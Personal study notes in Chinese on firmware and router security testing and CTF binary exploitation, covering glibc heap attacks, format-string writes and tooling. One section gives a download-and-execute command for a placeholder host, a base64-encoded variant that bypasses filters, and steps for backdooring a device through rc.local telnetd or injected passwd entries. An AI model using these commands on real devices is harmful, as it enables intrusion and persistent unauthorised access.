# tutor

1.   `;` 和 `&&` 都会按顺序执行各个代码，但区别在于分号不管前一指令成功与否，而 `&` 符会等待前一指令执行成功

2.   \`（反引号）、\'（单引号）、\"（双引号）的区别是
     1.   a = \`ls -l\`，将执行结果作为一个字符串返回给 a
     2.   a = \'\$abc\'，将用于定义一个完整的字符串，\$ 将不会被识别成变量
     3.   a = \"$abc\"，将用于定义字符串，但是其中的 \$ 等情况可以被识别和拓展

3.   `/sbin`：系统基本命令，管理员权限；`/bin`：系统一些扩展指令，管理员、普通用户权限；`/usr/bin`、`\opt`：安装软件后的命令，管理员、普通用户权限；

4.   `netstat -nlp`，numeric 不尝试显示 host 而是 ip、listenning、show programs

5.   `ps -aux`，a 全部、u 展示 user、x 展示所有进程

6.   `uname -a`，a 全部、r kernel、p processor

7.   `ping -c 3 host`，count、s size

8.   用于打印程序的全局符号信息 `nm -D x.so`、`nm -a an_elf`，a 打印所有符号、D 只显示动态链接符号、g 只显示外部符号、n 不对符号排序；对应打印出的单字母有对应含义：

     ```bash
     U	# 未定义符号，例如来自其他 so 的符号，system puts
     T	# .text 中定义的符号，即函数名
     t	# .text 中 static 的 function
     D	# .data 已初始化数据
     c	# 未初始化数值
     ```

     通过 `nm -D /path/to/sth.so | grep function_name` 可以由此判断其他 elf 在调用某个函数所在的动态链接库，例如 `$ nm -D lib/libmwopenrpc.so | grep GetByPseudoNameDomain` 回显为 `0008559c T IF_GetByPseudoNameDomain`，代表该函数在 libmwopenrpc.so 里被定义

9.   `sudo su`，b 后台执行命令、D 先修改目录、i 先登录到目标用户的 shell、l 列出当前用户的权限、R 执行 chroot 到某个目录、-S 使用 cli 将密码进行传参

10.   `xxd`，-r 16 进制展示、-p plain text 展示、

11.   `binwalk`
      1.   插件：`binwalk --enable-plugin=zlib fw.bin`，--list-plugins 列出插件，
      2.   过滤：`binwalk -x jffs2 fw.bin` 排除哪些字符，`binwalk -y filesystem fw.bin` 只展示哪些字符，-S 简单过滤字符串
      3.   提取：`binwalk -e fw.bin`，`binwalk -Me fw.bin` 递归提取，加 `--extract=./extract-config.conf` 指定规则

12.   `diff file1 file2`，怎样改变能使 file1 和 file2 长得一样（change、add、delete）
      1.   `2,4 c 2,4`，需要修改（change） 2 到 4 行使得相同
      2.   

## himitsu

1.   检查是否明文传输（未加密）

2.   检查 button 的请求，使用 burpsuite 修改请求主题，检查是否能 rce

     1.   附加选项什么的
     2.   可以获取 web elf 程序的后端，找到 `system()` 这样的调用：`reg system(`
     3.   检查可能的 `getenv("HTTP_USER_AGENT")` 情况，在 web 界面注入 user_agent 实现环境劫持

3.   在有 rce 的情况下，上传文件的方法

     1.   不过滤字符，直接获取：`wget -O /tmp/exp.sh http://a:b/exp.sh && chmod +x /tmp/exp.sh && /tmp/exp.sh`
     2.   过滤字符，采用 base64 编码绕过：` echo "d2dldCAtTyAvdG1wL2V4cC5zaCBodHRwOi8vYTpiL2V4cC5zaCAmJiBjaG1vZCAreCAvdG1wL2V4cC5zaCAmJiAvdG1wL2V4cC5zaA==" | base64 -d | sh`
     3.   有的固件本身并没有某个 app，例如 nc。该应用的版本不支持某些功能，或者魔改了版本，因此可以通过主动上传一个静态链接后的 nc 到目标系统（注意架构）并指定使用之

4.   有硬件、能启动的情况下拿 shell 方法

     1.   改文件

          1.   生成 `/etc/shadow`、`/etc/passwd`、`/etc/group` 文件的备份
          2.   修改备份文件，模拟新增一个用户
          3.   在路由器的 web 界面中恢复配置，其会被覆盖到系统中
          4.   ssh、telnet 登录拿 shell

     2.   修改开机自启项

          1.   修改 `rc.local` 文件，开启 telnet 或主动反弹 shell：

               ```shell
               # 
               telnetd -l /bin/ash -p 
               ```

5.   

## emula

1.   qemu
1.   mosquitto

## tools

1.   r2
     1.   `r2 elf-file`
     2.   `>i`，info
     3.   `>afl`，看函数，fuzz
     4.   `>af func`，切换到函数 func
     5.   `>pdf @func`，反汇编展示 func
     6.   `>pdc @func`，看 func 的汇编
     7.   `>/str`，可以查找字符串
     8.   `>wx 90`，修改，将当前位置直接修改成 `\x90`
2.   gdbserver
     1.   


## protocol

1.   iec104











# pwn

[glibc src](https://sourceware.org/glibc/manual/)：`curl -o glibc_src/2.39.html`

## temp

```bash
cat /proc/version       查看 ubuntu 版本
pidof
sudo gdb -q ./pwn pid
objdump -d pwn | grep "ret"
objdump -R pwn      查看 got
ROPgadget --binary pwn | grep "pop rdi \| ret"
ROPgadget --binary libc6_2.23-0ubuntu11_amd64.so --string "/bin/sh"
ROPgadget --help
objdump -d 2 | grep "ret" -A 6 打印之后的 6 行 之前用 -B
ldd ./pwn   查看libc.so

cyclic 100  创建padding
cyclic -l 取 ESP 前 4/8 位 查看偏移 -> 得到 buf 的长度
    在这里还有一个应用 64 位程序 前6位用寄存器传参
    rdi rsi rdx rcx r8 r9
    通常我们要找的 return 的地址就放在 $rdi
        关于 pop rdi 的使用：将需要传给rdi的值放在 pop rdi 之下 就会自动将 栈顶(也就是值) 传给 rdi 然后再ret rdi的内容
    所以我们就要找 pop rdi 然后 ret
    
使用python
eval('0xF3')	# 可以直接看0xF3的十进制值

# vscode 远程 gdb.attach
tmux	# 进入
tmux set mouse on	# 设置鼠标滚动
## 在exp中写入
context.terminal = ['tmux', 'splitw', '-h']
gdb.attach(p)
```

>   找函数

```bash
# python3
libc = ELF('libc.so')
system_addr = libc.sym['system']

# 在gdb里面
shell
python -c "from pwn import *;elf = ELF('filename');print(hex(elf.sym['puts']))"
```

>   找 binsh

```bash
# python3
libc = ELF('libc.so')
binsh = next(libc.search(b"/bin/sh"))

# ROPgadget
ROPgadget --binary libc6_2.23-0ubuntu11_amd64.so --string "/bin/sh"

# strings linux自带
## -a 全扫描; -t 指定 o(八进制), d(十进制), x(十六进制)
strings -a -t x libc-2.23.so | grep "/bin/sh"
```

## exploit

### heap

堆和栈的漏洞利用之间存在一个重要区别：

栈逻辑（例如，使用哪种调用约定）编译到二进制文件中。无论系统使用哪个 libc 版本，每次 push 和 pop 或对栈的引用（例如 ebp+0x20）都是二进制文件的一部分，不受外部库的影响

动态申请内存空间需要 syscall，使得 process 在 kernel / user 态之间频繁切换，降低效率，故 library 会一次性向 kernel 申请大块内存空间，后续的动态申请都在这块空间中 **切割、分配、回收、合并** 等

glibc 使用 ptmalloc 来管理 heap

#### TLS

**mov eax, QWORD PTR [0x28]**

fs，全称 Segment Register，使用方式是 reg: offset = reg 里存的值 + offset

TLS 全称 **Thread-Local Storage**，Linux x64 使用 fs 寄存器存储 TLS 的位置，所谓 **fs:0x28**，即 stack canary，就是获取 [fs（TLS）+ 0x28] 处的值

如何获取 fs：`print (void)arch_prctl(0x1003, <放在什么位置, 例如 $rsp - 8>)`；或者直接在 pwngdb 里面输入 `tls`

#### chunk

prev_size / data：上一个 chunk 的 size 或 data，`P == 1 ? data : prev_size`

size：当前 chunk 的 size，**0x31 = 0x30 + 0x0 + 0x0 + 0x1**

A：NON_MAIN_ARENA bit，是否由其他 arena 管理，一般都是 0

M：IS_MMAPPED bit，是否由 mmap 创造，

P：PREV_INUSE bit，临近的上一个 chunk 是否正在使用

fd pointer（forward pointer）：该 chunk 的前一个 chunk 地址，例如 chunk3.fd = chunk2

bk pointer（back pointer）：该 chunk 的后一个 chunk 地址，例如 chunk2.bk = chunk3

#### bins

参考 [PART 2: UNDERSTANDING THE GLIBC HEAP IMPLEMENTATION](https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/)

#### fastbin

`print &__malloc_hook`

fastbins addr：`&__malloc_hook + 0x20` or `main_arena + 0x16`

max <= global_max_fast，默认是 0x80；0x20（16） - 0x80（112），共 7 个（0x20，0x30，...，0x80），每个有 10 个，单向（只有 fd）；free 时不会清除下一个 chunk 的 P bit

释放堆块会调用 **malloc_consolidate** 防止攻击者使用 **use-after-free** 漏洞，其将负责合并相邻的空闲堆块以及清空 fastbins

#### tcache

glibc 2.26 以后，[0x20，0x30，0x40，...，0x410]，7 per node，total 64 bin

存在 TLS 里，tcache_perthread_struct，{0x20, cnt}，共 2 Bytes，故 7 个

free 后，bk 位不是真的 bk，是 key，用于安全检查，值是指向 tcache_perthread_struct 的 pointer

尝试访问一个已经被放入 tcache 链表的 chunk 的 fd 指针时，实际上访问的是 tcache 链表中下一个节点的地址，这个地址往往是无效的，因为它指向的内存区域可能已经被释放或者根本没有被分配给你的程序。

下面是还没 free 时，tcache_perthread_struct + first 2 chunk：

```markdown
0x5555 6666 0000: 0x0000 0000 0000 0000, 0x0000 0000 0000 0291
0x5555 6666 0010: 0x0000 0000 0002 0000, 0x0000 0000 0000 0000
...
0x5555 6666 0090: 0x0000 0000 0000 0000, 0x0000 5555 6666 02d0
...
0x5555 6666 0290: 0x0000 0000 0000 0000, 0x0000 0000 0000 0031
0x5555 6666 02a0: 0x0000 0005 5556 6660, 0x1234 5678 9abc def0
0x5555 6666 02b0: 0x0000 0000 0000 0000, 0x0000 0000 0000 0000
0x5555 6666 02c0: 0x0000 0000 0000 0000, 0x0000 0000 0000 0031
0x5555 6666 02d0: 0x0000 5555 6666 02a0, 0x1234 5678 9abc def0
...

```

高版本的 heap 会有不同，参考 [Glibc 高版本堆利用方法总结](https://cn-sec.com/archives/1618638.html)

进入到 `glibc-2.31` 之后，很多原有的堆利用方法就失效，因此 `glibc` 给堆分配机制陆陆续续打上了很多 `patch`，目前来看，与堆利用有关的 `patch` 有：

-   `tcachebin` 堆指针异或加密（`glibc-2.32` 引入）
-   `tcahebin` 链的数量检查（`glibc-2.33` 引入）
-   `fastbin` 堆指针异或加密（`glibc-2.32` 引入）
-   堆内存对齐检查（`glibc-2.32` 引入）
-   移除`__malloc_hook` 和`__free_hook`（`glibc-2.34` 引入）
-   引入 `tcache_key` 作为 `tcache` 的 `key` 检查（`glibc-2.34` 引入）
-   `__malloc_assert `移除掉 `IO` 处理函数（`glibc-2.36` 引入）
-   移除`__malloc_assert` 函数（`glibc-2.37` 引入）
-   将 `global_max_fast` 的数据类型修改为 `uint8_t`（`glibc-2.37` 引入）

#### main_arena

回收成单独的链表，fast bin：`main_arena.fast_bin -> fb1` to `main_arena.fast_bin -> fb2 -> fb1`，

### one_gadget

1.   `one_gadget libc.so.6`，
2.   `ELF('./libc.so.6').sym['__libc_realloc']`，手动调位置
3.   `flat(b'a' * 0x13, p64(one_gadget))`，
4.   `flat(b'a' * (0x13 - 0x8), p64(one_gadget), p64(__libc_realloc))`，
5.   或者直接向 bin 中的 chunk 的 fd 写入 `b'/bin/sh\x00'`，修改 \_\_malloc\_hook 为 `p64(_libc_system)`，然后 malloc 该 chunk，则会将 fd 当作参数传给 system

### heap buf overflow

参考 stack overflow，修改 ret **类似于** 修改相邻 chunk 中下一个 chunk 的某个值

### off by one

poisoning by null，申请了一个 0x100 的 chunka（这里和后续都默认包含 chunk header），申请一个 0x70 的 chunkb，再申请一个 0x100 的 chunkc，最后申请一个 0x20 的 chunkd 用来防止 top chunk 的 conlidate

1.   free chunka
2.   free chunkb
3.   malloc 0x70，此时该 chunk 被放置于 chunkb
4.   fill chunkb with 'b' * 0x68，遇到 strcpy 等函数，会在末尾加 `\x00`，导致 chunkc 的 chunkc.header.size 位的 0x101 变成 0x100（\x01 -> \x00），**同时还要保证 chunkc.header.prev_size = chunka.size + chunkb.size**（这里可以采用 one by one 的方式将 chunkc.header.prev_size 由 `0x6262626262626262` 修改成 `0x0000000000000170`）
5.   free chunkc
6.   此时的情况应该为：chunka 和 chunkc 是 free 状态，而 chunkb 是 used 状态，造成堆块重叠，即 chunka 和 chunkc 被 free，而中间夹着一个 chunkb，使得 chunkb 可以被 use after free。chunka 直到整个 chunkc 都被 conlidate，合成一个较大的 chunk，大小为 0x270，且该 chunk 被放入 unsorted bin，地址为原来的 chunka，fd 和 bk 指向 unsorted bin 的地址。
7.   申请一个 0x100 大小的 chunk，则 chunka 此时正好申请到 chunkb 的地方，使得 chunkb 的 prev_size 变成 0x100，size 变成 0x170（0x270 - 0x100），由于替代了原来 unsorted bin 中的 chunka，该 chunkb 的fd 和 bk 则继续指向 unsorted bin，此时只需要 print chunkb 就能获取到 unsorted bin 在 libc 中的位置，结合各种 offset 就能推算出 glibc 的基址

### chunk dup

>   duplicate，重复；即 double free
>
>   fastbin dup，tcache dup

由于 free 会检查新 free 的 chunk 和目前已经在 bins 中的 chunk 的地址是否相同，则在第二次 free 相同 victim 之前，可以先 free 一个其他的 chunk 来绕过检查

同理，使用 malloc 申请 fastbin 中的 chunk 的时候，也会相同先检查拿出来的 chunk 的 size 是否所属于对应 fastbin 的 size，可以通过先修改掉改 chunk 的大小符合对应 fastbin 的大小，再申请该 chunk

在 glibc 2.31，tcache chunk 的 fd 是上一个 chunk 的 chunk.header addr，bk 是 tcache 值；在 free 一个符合 tcache 大小的 chunk 的时候，检查其 bk，若发现是 tcache 值，可以高度怀疑该 chunk 被 double free，于是会检查对应的整个 tcache 链表，因此会较难绕过

### tcache

在 tcache 打满的情况下，\_libc\_malloc 会优先从 tcache 中拿 chunk（\_libc\_malloc 源码中会检查 tcache 是否有 chunk），但是使用 \_libc\_calloc 就不会检查 tcache，而是直接从 fastbin 中拿 chunk

### unsorted bin

>   unsorted bin 的合并規則：

1.   鄰近的上一塊以及下一塊為 free，則該塊進入 unsorted bin
2.   鄰近下一塊為 top chunk，則 unsorted bin 合并入 top chunk；使用 `create(0x10)` 來當作 barrier，防止被合并到 top chunk

>   consolidate，unlink 機制：

檢查當前 chunk 的 size 以及下一塊 chunk' 的 prev\_size 是否一致；然後進行一個鏈表性檢查；

```c
if (chunksize(p) != prev_size(next_chunk(p)))
    malloc_printerr("corrupted size vs. prev_size");

mchunkptr fd_chunk_ahead = p->fd;
mchunkptr bk_chunk_behind = p->bk;

if (fd_chunk_ahead->bk != p || bk_chunk_behind->fd =! p)
    malloc_printer r("corrupted double-linked list");

# 然後進行 unlink 操作, 目的是將中間的 p 給解鏈
fd_chunk_ahead->bk = bk_chunk_behind;
bk_chunk_behind->fd = fd_chunk_ahead;
```

>   unsafe unlink 攻擊行爲：

由上述的 consolidate 和 unlink 機制，可以如此構造，一般的 heap 類型題目中，都會額外構造一個專門用於存儲 heap 堆塊的數組（通常是全域變量，被定義在 .bss 段），此處的目的就是對這些數組進行攻擊

|       | 0x0 ~ 0x7                               | 0x8 ~ 0xf                     |
| ----- | --------------------------------------- | ----------------------------- |
| 0x100 | chunk1.header.prev_size/data            | chunk1.header.size，**0x221** |
| 0x110 | 0                                       | **0x210**                     |
|       | &chunk1 - 0x18                          | &chunk1 - 0x10                |
|       | ...                                     | ...                           |
|       |                                         |                               |
| 0x320 | chunk2.header.prev_size/data，**0x210** | chunk1.header.size，0x22**0** |
|       | 0                                       | 0                             |

1.   通過 off by one，修改 chunk1 如表格所示：chunk2 的 prev\_size 被修改成 0x210（與 0x220 不同），且 off by one 一個 Byte，修改了 chunk2 的 0x221 為 0x220

2.   通過 **free chunk2**，由於 chunk2 的 prev_in_use 為 0，則進入 consolidate 的 unlink 流程如下：

     1.   首先確定 fake chunk 的位置：&fake = 0x320 - 0x210 = 0x110；此處有構造好的 fake chunk 資訊

     2.   unlink 機制中的 p 就是這裏的 fake chunk，則 `chunksize(p) == prev_size(next_chunk(p))`，通過

     3.   `mchunkptr fd_chunk_ahead = p->fd;` 以及 `mchunkptr bk_chunk_behind = p->bk;`，這裏的 `fd_chunk_ahead ` 和 `bk_chunk_behind` 就會被賦值成 **維護該 heap 鏈表的數組** 中，chunk1 位置減去 0x18 和 0x10 的位置，如以下列表所示

          | 地址          | 内容            |
          | ------------- | --------------- |
          | 0x20          | fd_chunk_ahead  |
          | 0x28          | bk_chunk_behind |
          | 0x30          |                 |
          | &chunk1，0x38 | chunk1          |
          | &chunk2，0x40 | chunk2          |

          參照以上表格，接下來開始檢查：`fd_chunk_ahead->bk == chunk1`，通過；`bk_chunk_behind->fd == chunk1`，通過

     4.   以上 2 點通過檢查，可以 free，并且開始 unlink 操作，

          1.   `fd_chunk_ahead->bk`，也就是 0x38 的位置，也就是 &chunk1，會被賦值成地址 0x28 的地方
          2.   `bk_chunk_behind->fd`，還是 0x38 的位置，又賦值成地址 0x20
          3.   由於只是 free 了 chunk2，而 chunk1 仍然是 used 狀態，可以通過 edit 等功能寫入信息，然而經過上文，成功修改了其内容為 heap 鏈表上的地址，造成了該維護 heap 鏈表的地址任意寫；後續可以選擇覆寫該維護鏈表到其他地址的任意寫

>   File Structure

pwn 題一開始的 `setvbuf(stdin, 0, _IONBF, 0)`，其目的就是設定 stdin/stdout/stderr，不要開啓 buffer 機制，這裏所謂的 buffer 機制指的就是源自于 glibc 中的 stdin/out/err，在開啓了 buffer 的情況下，程序在接收數據的時候，這些數據不會馬上進入到 elf 中，而是先存在 glibc 的 buffer 裏

### fmt

  1. `%[n$][type]`：对第 n 个数据操作

  2. `%[填充字符][长度]x`，输出对应指针的二进制值

     `%012x`，输出 `0000fff2a2f8`，总长度是12，左边用0填充空格

     `%12x`，输出 `____fff2a2f8`，总长度是12，左边有 `12 - 8 = 4` 个空格

  3. `%[length]c`：输出一个单一字符

  4. type：`%h_, _, l_`，对应 `short，int，long` 类型，`_` 取 

     d：整型，十进制，有符号

     u：整型，十进制，无符号

     o：整型，八进制，无符号，不带前缀

     \#o：整型，八进制，无符号，带前缀 0b

     x/X：整型，十六进制，无符号，不带前缀，如果是 X 则输出大写

     \#x：整型，十六进制，无符号，带前缀 0x

     f：浮点型，十进制，有符号

     s：字符串

     p：`void *`型，表示任意类型，自动转换

  5. `%n`：赋值。不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。

     `%10c%8$n`：先输出内存中 10 个字符，再将已经打印出的字符数量(10)赋值给内存中。

     `%8$hhn`：写入 双字节（一个h是单字节），值为 8，即 `\x00\x08`

  6. **4字节值修改**：假设需要使得值 `val = 16`，val 原来是 100（注意，这里的val如果是全局变量，则不在堆栈中），在得知了 val 的地址 [addr of val] 且得知了在栈上 [addr of val] 对应的位置相对偏移量为 6，则可以构造 `payload = [addr of val，4字节]%012d%6$n`，这样通过 `printf(\aa\aa\aa\aa%012d%6$n)` 来改写了 val 的值

  7. **2字节值修改**：假设需要修改某地址（4字节） `0x0804A024` 中的两字节，则可以构造 `payload = aa%8$np32(0x0804A024)`，这里前面的 `aa` 是为了写入2字节输出的，同时，由于 `aa%8$n` 这一字符串的相对偏移量为 6，则 `0X0804A024` 的相对偏移量就是 6+2=8 了，也刚好对应。

  8.  **大数修改**：假设要修改从地址 `0x0804A024` 开始到 `0x0804A027` 中存的一个值 `val = 2(表示为 0x00000002)`，将其修改成 `0x12345678`，可以构造`payload = p32(0x0804A024) + p32(0x0804A025) + p32(0x0804A026) + p32(0x0804A027) + pad1_len_x78 + %6$hn + pad2_len_x56 + %7$hn + pad3_len_x34 + %8$hn + pad4_len_x12 + %9$hn `

  9.  事实证明，只要找到了对应的位置和偏移量，就可以使用 `%k$n` 来写入信息

>   查找 offset 的方式

```c
// gcc -fPIE -pie -fno-stack-protector -z execstack -m32 -o fmtest fmtest.c
char buf[20];	// buf 的总长度是 20
buf = "AAAA|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|";
printf(&buf);

/*输出如下
AAAA|0xffec23a8|0xffec23c8|0x565a524c|0xf7f173fc|0x1|0x41414141|0x7c70257c|0x257c7025|0x70257c70|0x7c70257c|
*/
```

在调用输出函数 `printf` 的时候，第零个参数的值是 **格式化字符串(rdi)** 的地址。

然后再传入 **格式化字符串** 的

第一个参数：字符串 `AAAA|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|` 的指针地址

第二个参数：字符串内容地址 `AAAA|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|`

第三个参数：`0xffec23c8`，栈上紧挨着字符串内容的地址内容

...

第七个参数：`0x41414141`，存放字符串内容的栈中地址从这里开始

调用 `printf` 时栈（32位）上的分布如表（随机）：

| 地址                | 值                                                   |
| ------------------- | ---------------------------------------------------- |
| 0xffec238c          | ret 返回地址                                         |
| 0xffec2390          | 字符串 `AAAA\|%p\|%p\|%p`地址指针，0xffec23a8        |
| 0xffec2394          | 字符串地址，0xffec23a8，`%n$` 从这里开始记数 `n = 1` |
| 0xffec2398          | 栈中内容                                             |
| ...                 |                                                      |
| $eax，0xffec23a8    | 字符串开始地址                                       |
| ...                 |                                                      |
| （0xffec23c4）      | canary（可能有）                                     |
| $ebp，0xffec23c8    | 该 frame 的 ebp                                      |
| retAddr，0xffec23cc | 这个函数结束后的返回地址                             |

因此，传入给 `printf()` 函数的参数总长度为 **格式化字符串** 的 `参数总长度 + 1` 

使用 pwndbg 中的 `fmtarg` 功能：在想要利用的 `printf` 位置之前下断，然后 `b printf`，`fmtarg 0xffec23a8` ，可以返回 `printf第1个参数的` 相对偏移，然后减1即可。

## assembly

>   一些汇编指令

```assembly
push:	压入栈
mov: mov ab   将b值送给a值
sub:	减法算术运算指令
lea lds les 
    LEA r,m
    LDS r,m
    LES r,m  取地址至寄存器
callq:调用子程序
leaveq:将EBP寄存器的内容复制到ESP寄存器
retq:返回主程序
pop:弹出栈
xchg:交换字或字节

leave:
    move ebp, esp 把 ebp 值给 esp | 把 esp 指向 ebp
    pop ebp
    
test eax, eax	# 判断eax是否为0
```

>   寄存器

| 64位(8bytes = 32bits) | 32位(4bytes = 16bits) | 低4位(4bytes = 8bits) | 低2位(2bytes = 4bits) |
| --------------------- | --------------------- | --------------------- | --------------------- |
| rax                   | eax                   | ax                    | al                    |
| rbx                   | ebx                   | bx                    | bl                    |
| rcx                   | ecx                   | cx                    | cl                    |
| rdx                   | edx                   | dx                    | dl                    |

RAX，一般存返回值；RBP，栈底；RSP，栈顶；RIP，程序当前运行位置；RDI，通常是第一个参数

## pwndbg

    1. 确定两地址间的距离：`distance Addr1 Addr2`
    
    2. 查看各数据节位置：`elf`
    
    3. 查看 got 表：`got`
    
    4. info；查看程序信息：`info source`；查看断点：`info breakpoints`；查看函数信息：`info functions`
    
    5. 查看内存信息：`hexdump addr [查看数量 0x80 = 8行]`
    
    6. 查看栈：`stack [多少行]`，`telescope $rsp [行]`
    
    7. 修改反汇编的显示方式：`set disassembly-flavor [intel/att]`

## objdump

`objdump <option> <filename>`

    1. 反汇编主要执行的函数：`objdump -d file`
    
    2. 反汇编所有函数：`objdump -D file`
    
    3. 显示所有符号表：`objdump -x easyfmt`
    
    4. 显示主要执行的函数：`objdump -x easyfmt | grep ".text"`

## patchelf

### 正常打 patch

`patchelf --set-interpreter ./libs/2.23/ld-2.23.so --set-rpath ./libs/2.23 ./elf`

`patchelf --set-interpreter ./ld-2.23.so ./elf`，

`patchelf --replace-needed libc.so.6 ./libc-2.33.so ./elf`，

### 生成符号表

在 `/glibc-all-in-one/libs/2.23-0ubuntu3_amd64` 目录下

`objcopy -R .gnu_debuglink ./libc-2.23.so`，

`objcopy --add-gnu-debuglink=libc-2.23.so.debug ./libc-2.23.so`，

`mv .debug/libc-2.23.so ./debug/libc-2.23.so.debug`，

还可以删除符号表：`objcopy --remove-section=.gnu_debuglink libc-2.23.so`

## gcc

`gcc -g -fstack-protector -pie -fPIE -o fileName fileName.c`

1.   canary，`-fno-stack-protector`，`-fstack-protector`

2.   RELRO（Relocation Read-Only，about function@got），`-Wl,-z,relro,-z,now`，其中 `-Wl` 是必備的，`-z,relro` 表示添加 RELRO 保護，`-z,now` 表示"立即添加"（即 FULL RELRO）

     >   RELRO 分爲兩種形式：Partial RELRO 以及 FULL RELRO。前者是編譯時自動添加最基礎的 RELRO 保護，後者參考下文
     >
     >   Full RELRO is not a default compiler setting as it can greatly increase program startup time since all symbols must be resolved before the program is started. In large programs with thousands of symbols that need to be linked, this could cause a noticable delay in startup time.
     >
     >   完全 RELRO，對全部 GOT 表加上 Read-Only，這樣會增加 elf 程式的啓動速度，當 elf 程式所擁有的 got 表很多時，會導致不可忍受的啓動速度情況
     >
     >   而 Partial RELRO 是指只對 .got 保護，但是 .got.plt 仍然可寫（即第一次被使用后由 .got => .got.plt）





# java

## modified

1.   解压 jar 包：`jar xf`
2.   更新 jar 包

## patch

https://github.com/silentEAG/java-patch

https://github.com/H4cking2theGate/JarPatcher

javassist

java agent

## refer

1.   